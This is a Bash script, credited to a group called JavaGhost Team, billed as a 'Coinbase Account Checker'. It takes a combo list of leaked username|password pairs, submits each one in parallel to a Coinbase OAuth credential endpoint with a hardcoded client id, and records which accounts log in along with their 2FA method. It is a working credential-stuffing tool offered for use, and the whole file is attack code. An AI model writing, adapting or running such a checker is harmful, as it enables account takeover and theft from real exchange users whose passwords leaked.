# !/bin/bash
# Created by : ./LazyBoy - JavaGhost Team

# client id
client_id="34183b03a3e1f0b74ee6aa8a6150e90125de2d6c1ee4ff7880c2b7e6e98b11f5"

# color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

# banner
echo -e '''
\e[1;33m
                ╔═╗╔╗    ╔═╗╦ ╦╔═╗╔═╗╦╔═
                ║  ╠╩╗───║  ╠═╣║╣ ║  ╠╩╗
                ╚═╝╚═╝   ╚═╝╩ ╩╚═╝╚═╝╩ ╩
\e[1;37m
  Coinbase Account Checker \e[1;34m-\e[1;37m By \e[1;34m:\e[1;37m ./LazyBoy \e[1;34m-\e[1;37m JavaGhost Team
'''

# ask file
echo -e "${white}[ ${red}INFO ${white}] ONLY INPUT LIST USING DELIMITER ${blue}'${green}|${blue}' ${white}[ ${green}Ex ${blue}: ${green}USER|PASS ${white}]"
read -p $'\e[1;37m[ \e[1;32m? \e[1;37m] INPUT YOUR COMBO LIST \e[1;31m: \e[1;32m' ask_files
if [[ ! -e $ask_files ]]; then
	echo -e "${white}[ ERROR ${white}] ${blue}- ${red}LIST NOT FOUND IN YOUR DIRECTORY${white}"
	exit
else
	echo -e "${white}[ ${green}+ ${white}] START CHECKING\n"
fi

function Coinbase_login(){
	check_response=$(curl -s -XPOST "https://www.coinbase.com/oauth/authorize/with-credentials?client_id=${client_id}&scope=all%27" -d "username=$(echo "${list_accounts}" | cut -d "|" -f1)&password=$(echo "${list_accounts}" | cut -d "|" -f2)")
	if [[ $check_response =~ "2fa_required" ]]; then
		METHOD_2FA=$(echo "${check_response}" | grep -oP '"2fa_authentication":"\K[^"]+')
		echo -e "${white}[ LOGIN ${blue}: ${green}TRUE ${white}] ${blue}- ${green}${list_accounts} ${blue}- ${white}METHOD 2FA ${blue}: ${yellow}${METHOD_2FA}${white}"
		echo "${list_accounts} : ${METHOD_2FA}" >> VALID_ACCOUNTS.txt
	else
		echo -e "${white}[ LOGIN ${blue}: ${red}FALSE ${white}] ${blue}- ${red}${list_accounts}${white}"
	fi
}

# multi thread
LIMIT="15"
for list_accounts in $(cat $ask_files); do
	Coinbase_login "$list_accounts" &
	while (( $(jobs | wc -l) >= $LIMIT )); do
		sleep 0.1s
		jobs > /dev/null
	done
done
wait

echo -e "\n${white}[ ${green}+ ${white}] DONE CHECKING LIST"
echo -e "${white}[ ${green}? ${white}] TOTAL VALID ACCOUNT YOU GOT ${blue}: ${green}$(< VALID_ACCOUNTS.txt wc -l)${white}"
